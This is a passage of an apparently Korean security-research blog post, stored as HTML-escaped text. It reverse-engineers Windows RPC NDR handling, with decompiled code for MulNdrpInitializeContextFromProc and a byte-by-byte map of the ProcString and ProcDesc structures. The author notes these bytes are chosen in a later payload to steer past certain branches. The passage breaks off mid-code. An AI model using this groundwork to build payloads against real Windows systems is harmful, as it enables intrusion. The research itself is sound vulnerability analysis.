&amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD55C; ProcString&amp;#xC758; &amp;#xC77C;&amp;#xBD80;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xB97C; &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h4 id=&#34;MulNdrpInitializeContextFromProc&#34;&gt;&lt;a href=&#34;#MulNdrpInitializeContextFromProc&#34; class=&#34;headerlink&#34; title=&#34;MulNdrpInitializeContextFromProc&#34;&gt;&lt;/a&gt;&lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 __fastcall &lt;span class=&#34;hljs-title&#34;&gt;MulNdrpInitializeContextFromProc&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; SyntaxType, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *ProcString, NDR_PROC_CONTEXT *pContext, __int64 a4, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; a5)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; retval; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; v10; &lt;span class=&#34;hljs-comment&#34;&gt;// al&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; RpcFlag; &lt;span class=&#34;hljs-comment&#34;&gt;// er9&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v12; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v13; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v14; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v15; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v16; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; HandleType; &lt;span class=&#34;hljs-comment&#34;&gt;// dl&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 InterpreterFlags; &lt;span class=&#34;hljs-comment&#34;&gt;// al&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *ProcString1; &lt;span class=&#34;hljs-comment&#34;&gt;// rdi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; StackSize; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  __int64 ProcDesc; &lt;span class=&#34;hljs-comment&#34;&gt;// rdi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *param; &lt;span class=&#34;hljs-comment&#34;&gt;// r8&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 v24; &lt;span class=&#34;hljs-comment&#34;&gt;// cl&lt;/span&gt;
  __int64 v25; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;

  retval = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !a5 )                                    &lt;span class=&#34;hljs-comment&#34;&gt;// a5 == 0&lt;/span&gt;
  {                                             &lt;span class=&#34;hljs-comment&#34;&gt;// Init NDR_PROC_CONTEXT&lt;/span&gt;
    memset_0(pContext, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;ui64);           &lt;span class=&#34;hljs-comment&#34;&gt;// Size of NDR_PROC_CONTEXT&lt;/span&gt;
    pContext-&amp;gt;AllocateContext.BytesRemaining = &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;i64;&lt;span class=&#34;hljs-comment&#34;&gt;// Size of AllocateContext.PreAllocatedBlock&lt;/span&gt;
    pContext-&amp;gt;AllocateContext.pBlockPointer = (__int64)pContext-&amp;gt;AllocateContext.PreAllocatedBlock;
    pContext-&amp;gt;AllocateContext.MemoryList.Blink = &amp;amp;pContext-&amp;gt;AllocateContext.MemoryList;
    pContext-&amp;gt;AllocateContext.MemoryList.Flink = &amp;amp;pContext-&amp;gt;AllocateContext.MemoryList;
  }
  pContext-&amp;gt;pProcFormat = (__int64)ProcString;
  pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrGetBuffer;
  pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrpSendReceive;
  pContext-&amp;gt;StartofStack = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)a4;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( SyntaxType == &lt;span class=&#34;hljs-number&#34;&gt;0x8A885D04&lt;/span&gt; )               &lt;span class=&#34;hljs-comment&#34;&gt;// a1 == 0x8A885D04&lt;/span&gt;
  {
    LODWORD(pContext-&amp;gt;CurrentSyntaxType) = &lt;span class=&#34;hljs-number&#34;&gt;0x8A885D04&lt;/span&gt;;
    HandleType = *ProcString;
    pContext-&amp;gt;HandleType = *ProcString;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( HandleType == &lt;span class=&#34;hljs-number&#34;&gt;0x33&lt;/span&gt; )
    {
      pContext-&amp;gt;Flags |= &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;u;
      pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrNsSendReceive;
      pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrNsSendReceive;
    }
    InterpreterFlags = ProcString[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
    ProcString1 = ProcString + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;
    LOBYTE(pContext-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.InterpreterFlags) = InterpreterFlags;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (InterpreterFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )          &lt;span class=&#34;hljs-comment&#34;&gt;// HasRpcFlags&lt;/span&gt;
    {
      RpcFlag = *(_DWORD *)ProcString1;
      ProcString1 += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      RpcFlag = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    }
    retval = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)ProcString1;
    StackSize = *((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)ProcString1 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    ProcDesc = (__int64)(ProcString1 + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);      &lt;span class=&#34;hljs-comment&#34;&gt;// ProcString+6&lt;/span&gt;
    pContext-&amp;gt;StackSize = StackSize;
    pContext-&amp;gt;pHandleFormatSave = ProcDesc;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !HandleType )
    {
      v25 = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;i64;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_BYTE *)ProcDesc != &lt;span class=&#34;hljs-number&#34;&gt;0x32&lt;/span&gt; )
        v25 = &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;i64;
      ProcDesc += v25;
    }
    pContext-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc = ProcDesc;
    param = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;);
    v24 = *(_BYTE *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
    pContext-&amp;gt;NumberParams = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v24 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    {
      pContext-&amp;gt;Flags ^= (pContext-&amp;gt;Flags ^ (*(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;
      param += (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8)*param;
      *(_DWORD *)&amp;amp;pContext-&amp;gt;FloatDoubleMask = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        pContext-&amp;gt;CorrIncrement = &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        pContext-&amp;gt;CorrIncrement = &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;;
    }
    pContext-&amp;gt;Flags &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFF8&lt;/span&gt;;
    pContext-&amp;gt;Params = param;
    pContext-&amp;gt;Flags |= (InterpreterFlags &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; | ((v24 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; | (v24 &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2u&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    pContext-&amp;gt;ExceptionFlag = ((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8)~(InterpreterFlags &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;) &amp;amp; ((pContext-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
  }
  v15 = pContext-&amp;gt;Flags;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v15 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrGetPipeBuffer;
    RpcFlag = RpcFlag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFEFFF&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;;
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrpPipeSendReceive;
  }
  v16 = v15 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFEF&lt;/span&gt;;
  pContext-&amp;gt;RpcFlgs = RpcFlag;
  pContext-&amp;gt;Flags = v16;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v16 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrpProxyGetBuffer;
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrpProxySendReceive;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; retval;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; ProcString&amp;#xC758; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC5D0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBA3C;&amp;#xC800; &amp;#xB2E4;&amp;#xC12F; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; 0&amp;#xC774; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xC5C8;&amp;#xC73C;&amp;#xB2C8; &lt;code&gt;pContext&lt;/code&gt;&amp;#xC758; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xACE0; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;SyntaxType&lt;/code&gt;&amp;#xC740; &lt;code&gt;0x8A885D04&lt;/code&gt;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; if &amp;#xBB38;&amp;#xC73C;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBCC0;&amp;#xC218; &amp;#xBA85;&amp;#xC740; &amp;#xCC98;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xC800;&amp;#xB807;&amp;#xAC8C; &amp;#xC608;&amp;#xC058;&amp;#xAC8C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xAC12;&amp;#xC774; &amp;#xB300;&amp;#xC785;&amp;#xB418;&amp;#xB294; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD544;&amp;#xB4DC;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBCF4;&amp;#xACE0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xAC12;&amp;#xC778;&amp;#xC9C0; &amp;#xC720;&amp;#xCD94;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC81C;&amp;#xAC00; &amp;#xBD84;&amp;#xC11D;&amp;#xD55C; ProcString&amp;#xC758; &amp;#xAD6C;&amp;#xC870;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ProcString[0]&lt;/code&gt;: &lt;code&gt;HandleType&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&amp;#xC774; &amp;#xAC12;&amp;#xC774; 0&amp;#xC774;&amp;#xAC70;&amp;#xB098; 0x33&amp;#xC774;&amp;#xBA74; &amp;#xB2E4;&amp;#xB978; &amp;#xBD84;&amp;#xAE30;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xC791;&amp;#xC5C5;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294;&amp;#xB370; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC758;&amp;#xBBF8;&amp;#xB97C; &amp;#xAC16;&amp;#xB294;&amp;#xC9C0; &amp;#xBAA8;&amp;#xB974;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD84;&amp;#xAE30;&amp;#xB97C; &amp;#xD68C;&amp;#xD53C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xD6C4;&amp;#xC220;&amp;#xD560; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;ProcString[0]&lt;/code&gt;&amp;#xC740; 0&amp;#xC774;&amp;#xB098; 0x33&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString[1]&lt;/code&gt;: &lt;code&gt;InterpreterFlags&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&amp;#xC774; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xC758; 4&amp;#xBC88;&amp;#xC9F8; &amp;#xBE44;&amp;#xD2B8;&amp;#xAC00; 1&amp;#xC774;&amp;#xBA74; &lt;code&gt;ProcString&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;RpcFlag&lt;/code&gt;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC758;&amp;#xBBF8;&amp;#xD55C;&amp;#xB2E4;. &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xC791;&amp;#xC5C5;&amp;#xC744; &amp;#xD68C;&amp;#xD53C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC774; &amp;#xB610;&amp;#xD55C; 8&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xD588;&amp;#xB2E4;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString[2~3]&lt;/code&gt;&amp;#xC758; 2&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;: &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xD560; &amp;#xAC12;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString[4~5]&lt;/code&gt;&amp;#xC758; 2&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;: &lt;code&gt;StackSize&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&amp;#xC5B4;&amp;#xB5A4; Stack&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xC778;&amp;#xC9C0;&amp;#xB294; &amp;#xD6C4;&amp;#xC220; &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString+6 ~&lt;/code&gt;: &lt;code&gt;ProcDesc&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pContext-&amp;gt;NdrInfo.pProcDesc&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xC785;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &lt;code&gt;ProcDesc&lt;/code&gt;&amp;#xB77C;&amp;#xACE0; &amp;#xC720;&amp;#xCD94; &amp;#xAC00;&amp;#xB2A5;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC73C;&amp;#xB85C;&amp;#xB294; &lt;code&gt;HandleType&lt;/code&gt;&amp;#xC774; 0&amp;#xC774;&amp;#xB098; 0x33&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xACE0; &lt;code&gt;InterpreterFlags&lt;/code&gt;&amp;#xC758; &lt;code&gt;HasRpcFlags&lt;/code&gt;&amp;#xAC00; False&amp;#xC77C; &amp;#xB54C; &lt;code&gt;ProcString+6&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;ProcDesc&lt;/code&gt;&amp;#xC758; &amp;#xAD6C;&amp;#xC870;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ProcDesc[4]&lt;/code&gt;: Flags&lt;ul&gt;
&lt;li&gt;&amp;#xD6C4;&amp;#xC220;&amp;#xD560; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xBC18;&amp;#xD658; &amp;#xC9C1;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC774; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xC758; 3&amp;#xBC88;&amp;#xC9F8; &amp;#xBE44;&amp;#xD2B8;&amp;#xAC00; 1&amp;#xC778;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD574;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xBC18;&amp;#xD658;&amp;#xAC12; &amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcDesc[5]&lt;/code&gt;: Params&amp;#xC758; &amp;#xC218;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;NdrpServerUnMashal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB97C; &amp;#xD30C;&amp;#xC2F1;&amp;#xD560; &amp;#xB54C; &amp;#xCC38;&amp;#xC870;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcDesc + 6 ~&lt;/code&gt;: Params&lt;ul&gt;
&lt;li&gt;&amp;#xD6C4;&amp;#xC220;&amp;#xD560; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xAC01; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xC758; &amp;#xC2A4;&amp;#xD0DD; &amp;#xC0C1;&amp;#xC758; &amp;#xC704;&amp;#xCE58; &amp;#xAE38;&amp;#xC774; &amp;#xB4F1;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB4E4;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NDR_PROC_CONTEXT-&amp;gt;Params&lt;/code&gt;&amp;#xAC00; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0B4;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC124;&amp;#xBA85;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &amp;#xC544;&amp;#xC2DC;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xAC12;&amp;#xB4E4;&amp;#xC774; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xC5B4;&amp;#xB5A4; &amp;#xAC12;&amp;#xC744; &amp;#xC804;&amp;#xB2EC;&amp;#xD574;&amp;#xC57C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xAC00; &amp;#xC62C;&amp;#xBC14;&amp;#xB974;&amp;#xAC8C; &amp;#xD30C;&amp;#xC2F1;&amp;#xB420; &amp;#xC9C0;&amp;#xB294; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACE0; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt; &amp;#xBC18;&amp;#xD658; &amp;#xD6C4;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;StackSize2 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)NdrProcContext.StackSize;
AllignedStackSize = (NdrProcContext.StackSize + &lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFF0&lt;/span&gt;;
v13 = AllignedStackSize;
BytesRemaining = NdrProcContext.AllocateContext.BytesRemaining;
&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( AllignedStackSize &amp;gt; NdrProcContext.AllocateContext.BytesRemaining )&lt;span class=&#34;hljs-comment&#34;&gt;// (StackSize + f &amp;amp; fffffff0) &amp;gt; 0x200 =&amp;gt; false&lt;/span&gt;
{
